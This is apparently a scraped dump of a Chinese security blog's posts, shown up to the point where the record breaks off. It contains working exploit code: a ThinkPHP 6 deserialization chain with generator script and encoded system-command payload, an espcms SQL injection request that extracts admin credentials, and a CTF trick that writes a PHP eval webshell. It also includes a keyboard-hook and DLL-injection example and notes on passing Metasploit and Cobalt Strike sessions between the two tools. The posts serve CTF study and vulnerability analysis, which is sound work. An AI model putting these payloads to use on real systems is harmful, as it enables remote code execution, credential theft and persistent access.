https://www.smi1e.top/thinkphp6-0-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5%e6%bc%8f%e6%b4%9e/ https://paper.seebug.org/1114/ https://xz.aliyun.com/t/8546","link":"/2021/04/10/Thinkphp6-0-0-6-0-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"title":"Thinkphp6.0.x反序列化","text":"分析利用链 1234567891011121314think\\Model --&gt; __destruct()think\\Model --&gt; save()think\\Model --&gt; updateData()think\\Model --&gt; checkAllowFields()think\\Model --&gt; db()后半部分利用链（同tp 5.2后半部分利用链)think\\model\\concern\\Conversion --&gt; __toString()think\\model\\concern\\Conversion --&gt; __toJson()think\\model\\concern\\Conversion --&gt; __toArray()think\\model\\concern\\Attribute --&gt; getAttr()think\\model\\concern\\Attribute --&gt; getValue() vendor/topthink/think-orm/src/Model.php Model类中存在__destruct()方法，令$this-&gt;lazySave等于true，调用save()。Model类为抽象类，利用的时候要用它的子类Pivot 跟进save()函数，触发点位于updateData函数内，首先需要构造参数防止函数直接返回，才能进入updateData()函数 需要满足三个条件才能进入updateData()， 1.$this-&gt;exists为true 2.isEmpty()需要返回false，给$this-&gt;data赋值即可 3.trigger()需要返回true，让$this-&gt;withEvent等于false checkAllowFields()触发__toString()，需要构造参数防止提前return，第一个if条件已经满足。第二个if，需要empty($data)等于false /vendor/topthink/think-orm/src/model/concern/Attribute.php 跟进getChangeData()方法，让$this-&gt;force和$this-&gt;data都有值就可以 需要先满足$this-&gt;field为空、$this-&gt;schema为空两个条件才能调用$this-&gt;db() db()方法中出现了拼接字符串操作，触发__toString()，需要先让$this-&gt;connection等于mysql 接下来就是原来tp5的__toString利用链，由于model\\concern\\Conversion是一个trait复用类，所以只要在Model下use即可 vendor/topthink/think-orm/src/model/concern/Conversion.php 存在__toString()方法，调用toJson() 跟进toJson()，调用__toArray() toArray() vendor/topthink/think-orm/src/model/concern/Attribute.php getAttr()函数，调用getValue() getData() getRealFieldName()，$this-&gt;strict等于true返回$name，这样getData()方法就会返回$this-&gt;data[$name]。 getValue()函数中存在命令执行，当$this-&gt;withAttr[$fieldName]不为数组的时候触发。 利用exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpnamespace think\\model\\concern { trait Conversion { } trait Attribute { private $data; private $withAttr = [&quot;xxx&quot; =&gt; &quot;system&quot;]; public function get() { $this-&gt;data = [&quot;xxx&quot; =&gt; &quot;whoami&quot;]; } }}namespace think{ abstract class Model{ use model\\concern\\Attribute; use model\\concern\\Conversion; private $lazySave; protected $withEvent; private $exists; private $force; protected $field; protected $schema; protected $table; function __construct(){ $this-&gt;lazySave = true; $this-&gt;withEvent = false; $this-&gt;exists = true; $this-&gt;force = true; $this-&gt;field = []; $this-&gt;schema = []; $this-&gt;table = true; } }}namespace think\\model{ use think\\Model; class Pivot extends Model { function __construct($obj='') { //定义this-&gt;data不为空 parent::__construct(); $this-&gt;get(); $this-&gt;table = $obj; } } $a = new Pivot(); $b = new Pivot($a); echo urlencode(serialize($b));} 本地测试 [安洵杯 2019]iamthinking存在备份文件www.zip 查看源码得到版本为thinkphp6，查看控制器，发现存在unserialize。过滤了O开头的字符串，可以根据parse_url的特性绕过，在解析形如http://xxx.com///index.php?payload=cmd这样的URI时parse_url会返回false。 在解析形如http://xxx.com///index.php?payload=cmd这样的URI时parse_url会返回false exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpnamespace think\\model\\concern { trait Conversion { } trait Attribute { private $data; private $withAttr = [&quot;xxx&quot; =&gt; &quot;system&quot;]; public function get() { $this-&gt;data = [&quot;xxx&quot; =&gt; &quot;cat /flag&quot;]; } }}namespace think{ abstract class Model{ use model\\concern\\Attribute; use model\\concern\\Conversion; private $lazySave; protected $withEvent; private $exists; private $force; protected $field; protected $schema; protected $table; function __construct(){ $this-&gt;lazySave = true; $this-&gt;withEvent = false; $this-&gt;exists = true; $this-&gt;force = true; $this-&gt;field = []; $this-&gt;schema = []; $this-&gt;table = true; } }}namespace think\\model{ use think\\Model; class Pivot extends Model { function __construct($obj='') { //定义this-&gt;data不为空 parent::__construct(); $this-&gt;get(); $this-&gt;table = $obj; } } $a = new Pivot(); $b = new Pivot($a); echo urlencode(serialize($b));} 利用反序列化漏洞，得到flag 1http://c9c7cb46-f78b-4359-a3b6-7cfc292d6693.node3.buuoj.cn///public/?payload=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00field%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00schema%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00field%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00schema%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A6%3A%22system%22%3B%7D%7D 参考 https://www.cnblogs.com/20175211lyz/p/12203047.html https://forum.90sec.com/t/topic/1160","link":"/2021/04/11/Thinkphp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"Windows钩子函数","text":"钩子原理​ Windows下的应用程序大部分是基于消息模式机制的，一些CUI程序不基于消息。Windows下应用程序都有一个消息函数，根据不同的消息来完成不同的功能。Windows提供的钩子机制是用来截获监视系统中的消息。不同的钩子可以处理不同信息。 ​ 钩子分为局部钩子和全局钩子。局部钩子是针对一个线程的，而全局钩子是针对整个操作系统内基于消息机制的应用程序的。全局钩子需要使用DLL文件，DLL文件里存放了钩子函数的代码。 ​ 安装全局钩子后，只要进程接收到可以发出钩子的消息后，全局钩子的DLL文件会被操作系统自动或强行的加载到该进程中。由此可见，设置消息钩子也是一种可以进行DLL注入的方法。 钩子函数钩子函数在系统消息触发时被系统调用 。在某个事件触发后，钩子函数捕获它并完成一些操作，是一段用以处理系统消息的程序 相关API函数123456LRESULT CALLBACK HookProc //所有的钩子函数都是这种形式( int nCode, WPARAM wParam, LPARAM lParam,); 参数nCode：钩子代码，钩子子程通过该代码来决定执行什么动作。该值取决于钩子的类型，每种类型都拥有自己特有的钩子代码集合。 参数wParam和lParam的值，都取决于钩子代码。但是一般都包含发送或者传递的消息的信息。 SetWindowsHookEx返回一个钩子句柄 123456HHOOK WINAPI SetWindowsHookEx( _In_ int idHook, _In_ HOOKPROC lpfn,//回调函数，名称任意，参数和返回值数据固定 _In_ HINSTANCE hMod,//为DllMain第一个参数g_Inst=(HMODULE)hModule; _In_ DWORD dwThreadId//全局钩子设置0); lpfn：指定HOOK函数的地址。如果dwThread参数被设置为0或者被设置为一个进程中的线程ID，则该回调HOOK函数只能在DLL文件中。如果dwThread为当前进程中的线程ID，则这个回调函数可以在当前进程中也可以在DLL中。 hMod：钩子函数所在模块的句柄。lpfn所在的模块的句柄，如果dwThreadId为当前进程中的线程ID，而且lpfn所指向的函数在当前进程中，那么hMod被设置为NULL dwThreadId：需要被挂钩的线程ID号（指定的话为局部钩子），如果设置为0表示在基于消息机制的所有的线程挂钩（全局钩子），如果指定为具体ID好，那么表示要在指定的线程中进行挂钩。这个参数影响上边两个参数的取值，决定了该钩子属于全局钩子还是局部钩子。 idHook:钩子的类型 UnhookWindowsEx移除先前用SetWindowsHookEx安装的钩子， 123BOOL UnhookWindowsHookEx( HHOOK hhk //钩子句柄); 可以多次反复安装钩子，而且可以安装多个同样类型的钩子。这样会形成一条钩子链，最后安装的钩子会首先截获到消息，当该钩子对消息处理完毕以后会选择返回，或者继续传递消息。通常情况下，为了消息可以传达到目标窗口，我们会选择将消息继续传递 CallNextHookEx使消息继续传递，第一个参数为钩子句柄，后面三个为钩子函数的参数 123456LRESULT CallNextHookEx( HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam); GetKeyNameTextGetKeyNameText函数检索表示键的名称的字符串。 12345int GetKeyNameTextA( LONG lParam,//钩子函数的第三个参数lparam LPSTR lpString,//接收的缓冲区 int cchSize//最大大小); 键盘钩子实例功能为用Messagebox显示按下键的字符。既然要截获键盘消息，那么肯定是截获系统范围内的键盘消息，因此需要安装全局钩子，这样就需要DLL文件支持。 首先新建DLL文件，定义两个导出函数和两个全局变量 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;#include &lt;Windows.h&gt;//定义导出函数，开始hook和结束hookextern &quot;C&quot; __declspec(dllexport) void SetHookOn();extern &quot;C&quot; __declspec(dllexport) void SetHookOff();HHOOK g_Hook = NULL;HINSTANCE g_Inst = NULL;//重写钩子函数//CallNextHookEx函数表示将当前钩子传递给钩子链中的下一个钩子//第一个参数当前钩子的句柄。如果直接返回0，则表示中断钩子传递//对钩子进行拦截LRESULT CALLBACK KeyboardProc( int code, WPARAM wParam, LPARAM lParam){//进入钩子函数的第一个判断，如果code&lt;0必须调用CallNextHookEx将消息继续传递下去，不对消息进行处理，并返回CallNextHookEx的返回值，MSDN要求。 if (code &lt; 0) { return CallNextHookEx(g_Hook, code, wParam, lParam); }//如果code等于HC_ACTION，表示消息中含有按键消息，如果为WM_KEYDOWN显示按键对应文本 if (code == HC_ACTION &amp;&amp; lParam &gt; 0) { TCHAR szBuf[MAXBYTE] = { 0 }; GetKeyNameText(lParam, szBuf, MAXBYTE); MessageBox(NULL, szBuf, NULL, MB_OK); } return CallNextHookEx(g_Hook, code, wParam, lParam);}void SetHookOn(){ g_Hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_Inst, 0);}void SetHookOff(){ UnhookWindowsHookEx(g_Hook);}BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ){ g_Inst = (HMODULE)hModule; switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE;} 在DllMain函数中，需要保存该DLL模块的句柄，以方便安装全局钩子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108// MFCKeyboardHookDlg.cpp: 实现文件//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;MFCKeyboardHook.h&quot;#include &quot;MFCKeyboardHookDlg.h&quot;#include &quot;afxdialogex.h&quot;#pragma comment(lib,&quot;KeyboardHook&quot;) extern &quot;C&quot; void SetHookOn();extern &quot;C&quot; void SetHookOff();#ifdef _DEBUG#define new DEBUG_NEW#endif// CMFCKeyboardHookDlg 对话框CMFCKeyboardHookDlg::CMFCKeyboardHookDlg(CWnd* pParent /*=nullptr*/) : CDialog(IDD_MFCKEYBOARDHOOK_DIALOG, pParent){ m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME);}void CMFCKeyboardHookDlg::DoDataExchange(CDataExchange* pDX){ CDialog::DoDataExchange(pDX);}BEGIN_MESSAGE_MAP(CMFCKeyboardHookDlg, CDialog) ON_WM_PAINT() ON_WM_QUERYDRAGICON() ON_BN_CLICKED(IDC_BUTTON2, &amp;CMFCKeyboardHookDlg::OnBnClickedButton2) ON_BN_CLICKED(IDC_BUTTON1, &amp;CMFCKeyboardHookDlg::OnBnClickedButton1)END_MESSAGE_MAP()// CMFCKeyboardHookDlg 消息处理程序BOOL CMFCKeyboardHookDlg::OnInitDialog(){ CDialog::OnInitDialog(); // 设置此对话框的图标。 当应用程序主窗口不是对话框时，框架将自动 // 执行此操作 SetIcon(m_hIcon, TRUE); // 设置大图标 SetIcon(m_hIcon, FALSE); // 设置小图标 // TODO: 在此添加额外的初始化代码 return TRUE; // 除非将焦点设置到控件，否则返回 TRUE}// 如果向对话框添加最小化按钮，则需要下面的代码// 来绘制该图标。 对于使用文档/视图模型的 MFC 应用程序，// 这将由框架自动完成。void CMFCKeyboardHookDlg::OnPaint(){ if (IsIconic()) { CPaintDC dc(this); // 用于绘制的设备上下文 SendMessage(WM_ICONERASEBKGND, reinterpret_cast&lt;WPARAM&gt;(dc.GetSafeHdc()), 0); // 使图标在工作区矩形中居中 int cxIcon = GetSystemMetrics(SM_CXICON); int cyIcon = GetSystemMetrics(SM_CYICON); CRect rect; GetClientRect(&amp;rect); int x = (rect.Width() - cxIcon + 1) / 2; int y = (rect.Height() - cyIcon + 1) / 2; // 绘制图标 dc.DrawIcon(x, y, m_hIcon); } else { CDialog::OnPaint(); }}//当用户拖动最小化窗口时系统调用此函数取得光标//显示。HCURSOR CMFCKeyboardHookDlg::OnQueryDragIcon(){ return static_cast&lt;HCURSOR&gt;(m_hIcon);}void CMFCKeyboardHookDlg::OnBnClickedButton2(){ // TODO: 在此添加控件通知处理程序代码 SetHookOn();}void CMFCKeyboardHookDlg::OnBnClickedButton1(){ // TODO: 在此添加控件通知处理程序代码 SetHookOff();} 全局钩子DLL注入WH_GETMESSAGE：该钩子作用是监视被投递到消息队列的消息。也就是在调用GetMessage()或PeekMessage()函数时，函数从消息队列中获取一个消息后调用该钩子。 利用WH_GETMESSAGE可以将DLL文件注入到所有的基于消息机制的程序中，在需要DLL大范围注入到基于消息的进程中时可以使用这种方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;#include &lt;Windows.h&gt;#include &lt;tchar.h&gt;#pragma warning(disable:4996)#pragma data_seg(&quot;mydata&quot;)HHOOK g_Hook = NULL; //必须赋初值，否则微软编译器会把没有初始化的数据放到普通的未初始化数据段中 //而不是放在shared中,从而导致多个进程之间的共享行为失败#pragma data_seg()#pragma comment(linker,&quot;/SECTION:mydata,RWS&quot;) extern &quot;C&quot; __declspec(dllexport) void SetHookOn();extern &quot;C&quot; __declspec(dllexport) void SetHookOff();HINSTANCE g_hInst;LRESULT CALLBACK GetMessageProc( int nCode, WPARAM wParam, LPARAM lParam){ MessageBox(NULL, L&quot;Hooked&quot;, L&quot;提示&quot;, MB_ICONWARNING | MB_OKCANCEL); return CallNextHookEx(g_Hook, nCode, wParam, lParam);}void SetHookOn(){ g_Hook=SetWindowsHookEx(WH_GETMESSAGE, GetMessageProc, g_hInst, 0);}void SetHookOff(){ UnhookWindowsHookEx(g_Hook);}BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ){ switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: { g_hInst = hModule; } case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE;}","link":"/2021/02/05/Windows%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0/"},{"title":"","text":"espcms前台注入分析《代码审计 企业级Web代码安全架构》一书中出现的cms，14年的老版本出现的Insert型注入。漏洞位于前台提交订单处 /interface/order.php $ptitle和$tsn为可控变量，通过accept方法获取参数 12$ptitle = $this-&gt;fun-&gt;accept('ptitle', 'P');$tsn = $this-&gt;fun-&gt;accept('tsn', 'P'); /public/class_function.php处找到accept函数的定义，从$_GET和$_POST数组中获取内容，并使用daddslashes函数过滤。 查看daddslashes函数声明，首先判断gpc是否开启，未开启则开启gpc，当$string为数组或为字符串时，调用addslashes对函数进行过滤并返回过滤后的$string 第373行拼接并执行了sql语句，可控变量$tsn和$ptitle未经过任何过滤就拼接到了sql语句中,这个 $tsn 和 $did $ptitle 都是可控的变量,相当于 $_POST[XXX] ，$tsn 不为数组时取值就会变成 $tsn{x}的方式 ，$temp = “abc”$temp[0]的值为a。$tsn参数提交一个’，经过daddslashes转义后自动添加\\变成\\‘，取$tsn[0]为,可以利用这个来达到绕过转义的限制，来达到注入的目的。 正常请求的数据包，可以看到默认传递$ptitle[]和$tsn[]，%5B%5D为url编码后的[] 123456789101112131415POST /espcms/index.php?ac=order&amp;at=ordersave HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 541Origin: http://localhostConnection: closeReferer: http://localhost/espcms/index.php?ac=order&amp;at=orderpayCookie: cookieconsent_status=dismiss; Phpstorm-8e4b56ac=beb94186-86bf-4a9d-832a-863045cf4b2f; Hm_lvt_c12f88b5c1cd041a732dea597a5ec94c=1609381035; bdshare_firstime=1609381035017; Kffm_2132_saltkey=BgX15Dcg; Kffm_2132_lastvisit=1609472159; LankeMobile=p; ecisp_home_seccode=VneCeoRkPaRoYm1deaqUnow; ecisp_member_username=qtXCmg; ecisp_member_info=Z-LdZrRltZqompSolXLIpZqioo-c1J7eamZkZp2RbGxnbLVnZ2ZlaGKXbGxsspOclmObnm1nnJ6YaJtpb3Bnl2ZtYZTFb56abcJryJLGtJZkaJ2Wm51ka5yXmGhslGKRcJ9ybJObmpSWmW2TbseZ; PHPSESSID=fdcbb78c3f2f1dbfa3f269460137e63b; ecisp_order_list=l6CScLOnc2xvWJ5naFScmXNrcNysn2ScWpmamoicn3JmcHSocGlvU5POp66nqoN0zmuTc7Ku; ecisp_order_productmoney=aZiRZg; ecisp_order_sncode=aZ7CbZlpb25lm2lnamjDaXFpmZlxy2eXcWdlbpzHmJ4Upgrade-Insecure-Requests: 1userid=1&amp;productmoney=3200&amp;discount_productmoney=3200&amp;discountmoney=0&amp;tokenkey=85e30790ab01309cf9ba7c2cc40f03f8&amp;ptitle%5B%5D=HTC+Flyer+%E5%B9%B3%E6%9D%BF%E7%94%B5%E8%84%91&amp;tsn%5B%5D=SN20110830222536894&amp;bprice%5B%5D=3200.00&amp;oprice%5B%5D=3600.00&amp;did%5B%5D=27&amp;amount%5B%5D=1&amp;countprice%5B%5D=3200.00&amp;alias=rrr&amp;sex=0&amp;email=asdasd%40gmail.com&amp;tel=eeee&amp;mobile=eeee&amp;cityone=0&amp;citytwo=0&amp;citythree=0&amp;district=0&amp;address=eee&amp;zipcode=0&amp;sendtime=1&amp;osid=1&amp;opid=1&amp;content=&amp;invpayee=&amp;invcontent=&amp;submit=%E7%A1%AE%E8%AE%A4%E6%8F%90%E4%BA%A4%E8%AE%A2%E5%8D%95 正常提交执行的sql语句 1INSERT INTO espcms_order_info (oid,did,tsn,title,oprice,bprice,countprice,amount,inventory) VALUES (12,26,'','HTC S510e',3200,3100,3100,1,1) $tsn去掉[]后提交 \\ $ptitle[]提交 ,(SELECT CONCAT(USERNAME,0x2f,PASSWORD) FROM espcms_admin_member ),1,1,1,1,1)# ​ $tsn与$ptitle均有单引号包裹，拼接到sql语句中$tsn与$ptitle默认被当作数组处理，当$tsn为字符串时,尝试提交$tsn内容为‘，经过accept函数处理，daddslashes函数转义后$tsn为\\‘并拼接到sql语句中，原本包裹$tsn的后一个引号被转义，$tsn的前一个引号与$ptitle的前一个引号闭合，相当于$tsn实际内容为’\\‘,’ ​ 注入执行的sql语句如下 1INSERT INTO espcms_order_info (oid,did,tsn,title,oprice,bprice,countprice,amount,inventory) VALUES (12,36,'\\',',(SELECT CONCAT(USERNAME,0x2f,PASSWORD) FROM espcms_admin_member ),1,1,1,1,1)#',3200,3100,3100,1,1) 在提交订单时候用burpsuite抓包并修改 利用成功 参考： https://www.uedbox.com/post/25828/ https://www.seebug.org/vuldb/ssvid-94423","link":"/2021/01/06/espcms%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"},{"title":"java反序列化学习","text":"SerializeableSeializeable是java实现序列化机制的工具，序列化数据包含对象类型和属性值。 Serializeable工具的简单说明 1234只需要实现Serializeable接口就可以进行对象的序列化处理序列化对象可以是基本数据类型、集合类或其他对象使用transient、static关键字修饰的属性不会被序列化父类不可序列化时，需要父类中存在无参构造函数。 相关接口和类 123456java.io.Serializablejava.io.Externalizable //该接口需要实现writeExternal和readExternal函数控制序列化ObjectOutputObjectInputObjectOutputStreamObjectInputStream 序列化 123456789//创建OutputStream对象OutputStream outputStream= new FileOutputStream(&quot;serial&quot;);//将其封装到ObjectOutputStream对象中ObjectOutputStream objectOutputStream=new ObjectOutputStream((outputStream));//此后调用writeObject()对客完成对象的序列化，并将其发送给OutputStreamobjectOutputStream.writeObject(Object);//关闭资源objectOutputStream.close();outputStream.close(); 反序列化 123456789//创建OutputStream对象InputStream inputStream=new FileInputStream(&quot;serial&quot;);//将其封装到ObjectInputStream对象中ObjectInputStream objectInputStream=new ObjectInputStream((inputStream));//只需调用readObject(0即可完成对象的反序列化objectInputStream.readObject();//关闭资源objectInputStream.close();inputStream.close(); Serializable接口一般一个类只要继承了Serializable接口，就代表该类和其子类都能进行JDK的序列化 1234567891011121314151617181920212223242526272829303132333435363738394041424344package com.tq;import java.io.*;public class MyJavaSerialize { public static class UInfo implements Serializable{ private String userName; private int userAge; private String userAddress; public String getUserName(){return userName;}; public int getUserAge(){return userAge;}; public String getUserAddress(){return userAddress;}; public void setUserName(String userName){this.userName=userName;}; public void setUserAge(int userAge){this.userAge=userAge;}; public void setUserAddress(String userAddress){this.userAddress=userAddress;}; } public static void main(String[] args) throws Exception { UInfo userInfo=new UInfo(); userInfo.setUserAddress(&quot;a&quot;); userInfo.setUserAge(22); userInfo.setUserName(&quot;admin&quot;); OutputStream outputStream=new FileOutputStream(&quot;serial&quot;); ObjectOutputStream objectOutputStream=new ObjectOutputStream(outputStream); objectOutputStream.writeObject(userInfo); objectOutputStream.close(); outputStream.close(); InputStream inputStream=new FileInputStream(&quot;serial&quot;); ObjectInputStream objectInputStream=new ObjectInputStream(inputStream); UInfo unserialUInfo=(UInfo) objectInputStream.readObject(); objectInputStream.close(); inputStream.close(); System.out.println(unserialUInfo.userName); System.out.println(unserialUInfo.userAge); System.out.println(unserialUInfo.userAddress); }} 输出结果，工程目录下会生成一个serial文件，其内容就是序列化后的数据 Externalizable接口除了Serializable接口，java还提供了另一个序列化接口Externalizable，该接口继承自Serializable接口，但是有两个抽象函数：writeExternal和readExternal。需要自行实现两个函数来控制序列化流程，否则目标序列化类属性值会是类初始化后的默认值。 在使用Externalizable接口实现序列化时，读取对象会调用目标序列化类的无参构造函数去创建一个新的对象，再把徐磊话数据中的类属性值分别填充到新对象中。所以实现Externalizable接口的类必须提供一个public属性的无参构造函数 serialVersionUID目标序列化类有一个隐藏属性 1private static final long serialVerionUID Java虚拟机判断是否允许序列化数据被序列化时，会取决于两个类的serialVersionUID是否一致。serialVerionUID在不同编译器内可能有不同的值，开发者可以在目标序列化类中提供固定值。在提高serialVerionUID固定值的情况下，只要序列化数据中国的serialVerionUID和目标序列化类中的一致就可以成功反序列化。如果没有指定值，编译器会根据class文件内容通过一定算法生成值，在不同环境下，编译器得到的serialVerionUID值不同，就会导致反序列化失败。改变目标类中代码也可能会影响生成的serialVersionUID，此时会抛出java.io.InvalidClassException并指出serialVersionUID不一致。建议在目标序列化类中显示定义serialVersionUID并赋予明确的值。 显示定义serialVersionUID有两种用途： 1.在某些场合，希望类的不同版本兼容序列化，所以需要确保类的不同版本有相同的serialVersionUID 2.某些时候不希望类的不同版本对序列化有兼容，所以需要类的不同版本有不同的serialVerionUID 反序列化漏洞java有多种序列化和反序列化工具 123JDK自带的Serializablefastjson和jackson是JSON的知名反序列化工具xmldecoder和xstream是XML的知名反序列化工具 java拥有完善的第三方类库和满足各种需求的框架，但因为很多第三方类库引用广泛，如果其中某些组件出现安全问题，那么受影响范围将极为广泛。 漏洞入口ObjectInputStream对象的readObject函数调用是java反序列化流程的入口，序列化数据的来源包括：Cookie、GET参数、POST参数或者流、HTTP Head或者来自用户可控内容的数据库等。 触发场景： 12341.HTTP请求中的参数2.RMI，即Java远程方法调用，在RMI中传输的数据皆为序列化3.JMX，一个为应用程序植入管理功能的框架4.自定义协议 用来接收与发送原始的java对象 反序列化相关函数 1234567ObjectInputStream.readObjectObjectInputStream.readUnsharedXMLDecoder.readObjectYaml.loadXStream.fromXMLObjectMapper.readValueJSON.parseObject 数据特征序列化的数据头是不变的，传输过程中可能会对字节流进行编码，解码后查看字节流开头，反序列化数据开头包含两字节的魔术数字，后面是两字节的版本号，如ac ed 00 05，而经过Base64编码过序列化数据的字节流头部为Ro0AB，在攻击检测时可针对该特征进行匹配请求post中是否包含反序列化数据，判断是否为反序列化漏洞攻击。 利用形式JDK原生反序列化工具Serializable大致有两种利用形式 123451.完整对象前的利用在JDK对恶意序列化数据进行反序列化的过程中达成攻击效果，这种利用方式大多基于对java开发中频繁调用函数的理解，寻找漏洞触发点。例如commons-collections3.1反序列化漏洞利用中的rce gadget属于以readObject函数调用点为入口，直接在依赖包中寻找到rce的利用方式2.生成完整对象的利用如身份令牌反序列化，要等待对象反序列化完成后，利用其中的函数或者属性值完成攻击","link":"/2021/04/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"},{"title":"msf和cs联动","text":"cs派生给msf配置好listener，选择Foreign HTTP 使用cs的spawn功能 msf设置payload为/windows/meterpreter/reverse_http，ip和端口与listener中的一致，不要使用64位的payload，会出现问题。这样即可接收到派生过来的session msf派生给cs只有meterpreter类型的session才能派生给cs 使用msf中的windows/local/payload_inject模块，设置payload为windows/meterpreter/reverse_http，ip和端口填写cs监听的ip和端口，再指定。设置iDisablePayloadHandler为true，因为payload_inject执行后会产生一个新的handler，但是我们已经有了一个，所以不需要它。执行后即可再cs中看到上线的机器。","link":"/2021/03/11/msf%E5%92%8Ccs%E8%81%94%E5%8A%A8/"},{"title":"nepctf部分wp","text":"little_trick长度限制rce 1234567891011&lt;?php error_reporting(0); highlight_file(__FILE__); $nep = $_GET['nep']; $len = $_GET['len']; if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13){ eval(substr($nep,0,$len)); }else{ die('too long!'); }?&gt; 传入负数即可绕过 直接echo写马 1http://node4.hackingfor.fun:34567/052e4d95576306a511b353cae5aec562/?len=-1&amp;nep=`$_GET[1]`;1&amp;1=echo \\&lt;?php eval\\(\\$_POST\\[1\\]\\)\\;&gt;2.php 实际执行命令 12345echo \\&lt;?php eval\\(\\$_POST\\[1\\]\\)\\;&gt;2.phpecho eval\\(&gt;&gt;2.phpecho \\$_POST&gt;&gt;2.phpecho \\[1\\]&gt;&gt;2.phpecho \\)\\;&gt;&gt;2.php 蚁剑连接拿到flag 梦回牡丹亭反序列化 1.Game类的__destruct方法调用checking 属性choice等于login类,属性username和password等于admin，属性register等于admin 2.login类的checking方法调用open，这些属性在Game类中赋值：属性file等于Open类，属性filename等于shell.php 3.最终执行open类的open方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?phphighlight_file(__FILE__);error_reporting(0);include('shell.php');class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&gt;username='user'; $this-&gt;password='user'; } public function __wakeup(){ if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;){ //admin $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content); }else{ $this-&gt;choice = new register(); } } public function __destruct() { $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); }}class login{ public $file; public $filename; public $content; public function __construct($file,$filename,$content) { $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; } public function checking($username,$password) { if($username==='admin'&amp;&amp;$password==='admin'){ $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die('login success you can to open shell file!'); } }}class register{ public function checking($username,$password) { if($username==='admin'&amp;&amp;$password==='admin'){ die('success register admin'); }else{ die('please register admin '); } }}class Open{ function open($filename, $content){ if(!file_get_contents('waf.txt')){ shell($content); }else{ echo file_get_contents($filename.&quot;.php&quot;); //终点 } }}if($_GET['a']!==$_GET['b']&amp;&amp;(md5($_GET['a']) === md5($_GET['b'])) &amp;&amp; (sha1($_GET['a'])=== sha1($_GET['b']))){ // @unserialize(base64_decode($_POST['unser']));} 构造exp读取shell.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpclass Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public 